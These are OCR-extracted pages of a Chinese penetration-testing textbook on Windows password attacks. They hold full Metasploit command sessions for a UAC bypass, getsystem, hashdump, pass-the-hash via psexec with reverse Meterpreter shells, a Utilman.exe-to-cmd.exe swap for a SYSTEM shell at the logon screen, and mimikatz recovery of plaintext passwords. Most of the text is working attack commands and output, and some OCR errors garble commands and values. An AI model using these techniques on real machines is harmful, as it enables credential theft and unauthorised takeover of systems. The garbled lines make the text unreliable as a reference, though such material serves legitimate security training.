msf exploit(bypassuac)> exploit
[*] Started reverse handler on 192.168.6.103:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem...
[*] Uploading the bypass UAC executable to the filesystem..
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[] Sending stage (769536 bytes) to 192.168.6.106
15:34:38 +0800
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server usermame: NT AUTHORITYISYSTEM
从输出的信息中，可以看到此时lyw用户权限已经为SYSTEM。
（4）查看目标主机上所有用户的哈希密码值。执行命令如下所示：
meterpreter>run post/windows/gather/hashdump
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 45fa5958a01cf2b66b73daa174b19dae..
[*] Obtaining the user list and keys...
[*] Decrypting user keys..
[*] Dumping password hints...
Test:"123"
[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0.
Test:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:daf26fce5b47e01aae0f919f529
926e3...
lyw:1003:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4.:
alice:1004:aad3b435b51404eeaad3b435b51404ee:22315d6ed1a7d5f8a7c98c40e9fa2dec:
从输出的信息中，可以看到捕获到六个用户的哈希密码值。此时，可以使用SMBpsexec
模块绕过Hash值。
· 250 ·
---
## Page 263
第8章密码攻击
（5）后台运行会话2。执行命令如下所示：
meterpreter > background
[*] Backgrounding session 2...
（6）使用SMBpsexec模块，并设置需要的配置选项参数。执行命令如下所示：
msf exploit(bypassuac)>use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.6.114
#设置远程主机地址
RHOST => 192.168.6.114
msf exploit(psexec) > set SMBUser Test
#设置SMB用户
SMBUser => alice
msf exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:
22315d6ed1a7d5f8a7c98c40e9fa2dec
#设置SMB密码
SMBPass=>aad3b435b51404eeaad3b435b51404ee:22315d6ed1a7d5f8a7c98c40e9fa2dec
（7）启动攻击。执行命令如下所示：
msf exploit(psexec) > exploit
[*] Started reverse handler on 192.168.6.103:4444
[*] Connecting to the server...
[*] Authenticating to 192.168.6.114:445|WORKGROUP as user ‘lyw'..
[*] Uploading payload..
[]Created XBotpcOY.exe...
[+] Deleting\XBotpcOY.exe...
[*] Sending stage (769536 bytes) to 192.168.6.114
[*] Meterpreter session 3 opened (192.168.6.103:4444->192.168.6.114:49159) at 2014-07-22
17:32:13 +0800
从输出的信息中，可以看到使用“Test”用尺成功的打开了一个会话。
8.4绕过Utilman登录
Utilman是Windows辅助工具管理器。该程序是存放在Windows系统文件中最重要的
文件，通常情况下是在安装系统过程中自动创建的，对于系统正常运行来说至关重要。在
Windows下，使用Windows+U组合键可以调用Utilman进程。本节将介绍绕过Utilman程
序登录系统，就可以运行其他操作。
（1）在Windows界面，启动KaliLinuxLiveCD，如图8.7所示。
（2）在该界面选择Live（686-pae），按下回车键即可启动KaliLinux，如图8.8所示。
Applications
Places
Jul 19, 5:17 PM
 Home Folder
 Desktop
KALI LINUX
 Compter
 Flopy Drive
 43 GB Filesysten
c modc
43 GB FiLer
 Network
Connect to Server
图8.7KaliLinux引导界面
图8.8KaliLinux操作系统
· 251 *
---
## Page 264
第3篇各种渗透测试
（3）在该界面打开Windows文件系统。在KaliLinux桌面依次选择Places43GB
Filesystem选项，将打开如图8.9所示的界面。这里的43G表示当前Windows系统的磁盘
大小。
2454E29854E26C4C
-ox
FileEditViewGoBookmarksHelp
Devices
43GB Fi
QSearch
系统保留
ProgramData
Program Files
QMDownload
120 GB ..
Computer
 Home
Recovery
$Recycle.Bin
System Volume
m Desktop
Information
 File System
 Trash
Users
win32-loader
Windows
Network
 Browse Net.
4
Windows XP专业版
autoexec.bat
config.sys
图8.9Windows磁盘中的文件和文件夹
（4）该界面显示了Windows操作系统中的文件和文件夹。这里依次打开
WindowsSystem32文件夹，将显示如图8.10所示的内容。
System32
-口x
FileEdit ViewGoBookmarks Help
Devices
43GBFilesyst
Windows
←→
QSearch
系统保留
120 GB.
usercpl.d.L
userenv.dlL
uterinit.exe
Computer
 Home
usp10.dlI
utildlL.dlI
 Desktop
 File System
Trash
Utilman.exe
uxtheme.dlI
uudf.dlL
Network
 Browse Net...
UXInit.dIL
uxlib.dlI
uxlibres.dlI
uxtheme.dllL
图8.10System32目录中的内容
（5）在该文件夹中找到Utilman.exe文件，将该文件重命名为Utilman.old。然后复制
cmd.exe文件，并将其文件名修改为Utilman.exe。
（6）现在关闭KaliLinux，并启动Windows系统。在登录界面按下Windows+u组合键，
将显示如图8.11所示的界面。
· 252 ·
---
## Page 265
第8章密码攻击
hfosyatpl icannot
\systen32>
?
Windows7旗舰版
图8.11Windows登录界面
（7）从该界面可以看到打开一个命令提示符窗口。在该窗口中，可以执行一些DOS
命令。例如，使用whoami命令查看用户信息，将显示如图8.12所示的界面。
Theosystpn eannot f ind
Coprish2agHraCpghd
CMinoritysten32le
?
Windows7旗舰版
图8.12用户权限信息
（8）从输出的界面可以看到，当前用户拥有最高的权限。此时，就可以进行任何的
操作。
学习了绕过Utilman登录后，可以使用mimikatz工具恢复目标系统锁定状态时用户的
密码。下面将介绍使用mimikatz工具，从锁定状态恢复密码。
在操作之前需要做一些准备工作。首先从http://blog.gentilkiwi.com/mimikatz网站下载
mimikatz工具，其软件包名为mimikatz_trunk.zip。然后将该软件包解压，并保存到一个
USB磁盘中。本例中，将解压的文件保存到优盘的mimikatz目录中。
· 253 ·
---
## Page 266
第3篇各种渗透测试
（1）在系统中安装UtilmanBypass，以便能执行一些命令。
（2）在锁定桌面的Windows桌面按下Windows+u组合键，如图8.13所示。
hforyapplicatnon.f
epyright e)2e9 Mierosifablerpergtien.s th1 rightsd.
en32)
切换用户（W）
?
Windows7旗舰版
图8.13启动命令行
默认情况下使用Windows+u组合键启动DOS窗口后，该窗口缓冲区的高度是30。当
输出的数据较多时，将看不到所有的内容。所以需要到DOS窗口的属性菜单中，增加窗口
的高度，如图8.14所示。
“CAWindowssystem32utilman.exe国性
选项字件布局颜色
屏幕缓中区大小
宽度0）：
高度00：
窗口大小
宽度（）：
高度（)：
25
窗口位置
左):
9
上 ):
24
由系统定位窗口0）
碳定取消
图8.14属性菜单
在该界面选择“布局”标签，修改屏幕缓冲区大小下面的高度值。然后单击“确定”
按钮，即可滚动鼠标查看所有内容。
（3）从图8.13中可以看到，Windows7系统处于锁定状态。此时通过在命令行执行一
些命令恢复Windows用户密码。首先确认当前用户的权限，执行命令如下所示：
C:IWindowslsystem32> whoami
nt authoritylsystem
· 254 ·
---
## Page 267
第8章密码攻击
（4）进入到USB磁盘中，并查看磁盘中的内容。本例中的USB磁盘号F：，执行命
令如下所示：
C:IWindows\system32>F:
F:I>dir mimikatz
2014/05/26 03:45
4,311 README.md
2014/06/15 04:54
Win32
2014/06/1504:54
x64
从输出的信息中，可以看到mimikatz目录中有三个文件。其中Win32和x64表示
mimikatz的两个版本。根据自已的系统架构选择相应的版本，本例中的操作系统是32位，
所以选择使用Win32。
（5）查看Win32目录中的内容：
F:I>cd mimikatz
F:\Mimikatz>cd win32
F:Mimikatz\Win32>dir
2014/06/15 04:54
29,056 mimidrv.sys
2014/06/15 04:54
189,936 mimikatz.exe
2014/06/1504:54
27.632 mimilib.dll
从输出的信息中，可以看到Win32目录中有三个文件。其中，mimikatz是一个可执行
文件。
（6）运行mimikatz程序。执行命令如下所示：
F:\Mimikatz\Win32>mimikatz
#####
####
##/##
/***
##/##
Benjamin DELPYgentilkiwi(PI:EMAIL )
####
http://blog-gentilkiwi.com/mimikatz
(oe.eo)
####
with 14 modules * * */
mimikatz #
输出信息显示了mimikatz的一些相关信息，其中mimikatz#提示符表示成功登录到了
mimikatz程序。
（7）恢复密码。执行命令如下所示：
mimikatz # sekurlsa:logonPasswords
或：
mimikatz # sekurlsa:logonPasswords full
将输出如下所示的信息：
AuthenticationId:0;10201252(00000000:009ba8a4)
Session
 : Interactive from 1
User Name
MA:
Domain
 : Windows7Test
SID
: S-1-5-21-2306344666-604645106-2825843324-1001
[00010000]CredentialKeys
msV :
• NTLM
:32ed87bdb5fdc5e9cba88547376818d4
• SHA1
:6ed5833cf35286ebf8662b7b5949f0d742bbec3f
[00000003] Primary
·255 ·
---
## Page 268
第3篇各种渗透测试
Username:lyw
*Domain:Windows7Test
* NTLM
:32ed87bdb5fdc5e9cba88547376818d4
*SHA1
：6ed5833cf35286ebf8662b7b5949f0d742bbec3f
tspkg :
wdigest :
• Username : lyw
* Domain
:Windows7Test
* Password : 123456
kerberos:
* Username : lyw
*Domain:Windows7Test
* Password : (null)
ssp :
credman :
从以上输出信息中，可以看到锁定用户的所有信息。如用户名、各种加密的HASH值、
域名和密码等。
8.5破解纯文本密码工具mimikatz
mimikatz是一款强大的系统密码破解获取工具。该工具有段时间是作为一个独立程序
运行。现在已被添加到Metasploit框架中，并作为一个可加载的Meterpreter模块。当成功
的获取到一个远程会话时，使用mimikatz工具可以很快的恢复密码。本节将介绍使用
mimikatz工具恢复密码。
【实例8-3】演示使用mimikatz恢复纯文本密码。具体操作步骤如下所示。
（1）通过在目标主机（Windows7）上运行Veil创建的可执行文件backup.exe，获取
一个远程会话。如下所示：
msf exploit(handler) > exploit
[] Started reverse handler on 192.168.6.103:4444
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.6.110
[] Meterpreter session 2 opened (192.168.6.103:4444 -> 192.168.6.110:1523) at 2014-07-19
16:54:18 +0800
meterpreter>
从输出的信息中，可以看到获取到了一个与192.168.6.110主机的远程会话。
（2）确认目标用户的权限。执行命令如下所示：
meterpreter > getuid
Serverusemame:NTAUTHORITYISYSTEM
从输出信息中，可以看到当前用户已经是系统权限。此时，就可以进行其他操作了。
（3）加载mimikatz模块。执行命令如下所示：
meterpreter > load mimikatz
Loading extension mimikatz...success.
从输出的信息中，可以看到mimikatz模块已加载成功。
· 256 ·
---
## Page 269
第8章密码攻击
（4）查看mimikatz模块下有效的命令。执行命令如下所示：
meterpreter > help
执行以上命令后，会输出大量的信息。其中，在Meterpreter中所有的命令都已分类。
这里主要介绍下mimikatz相关的命令，如下所示：
Mimikatz Commands
Command
Description
kerberos
Attempt to retrieve kerberos creds
livessp
Attempt to retrieve livessp creds
mimikatz_command Run a custom commannd
msv
Attempt to retrieve msv creds (hashes)
ssp
Attempt to retrieve ssp creds
tspkg
Attempt to retrieve tspkg creds
wdigest
Attempt to retrieve wdigest creds
以上输出信息显示了可执行的Mimikatz命令。如回复kerberos信息、livessp信息和哈
希信息等。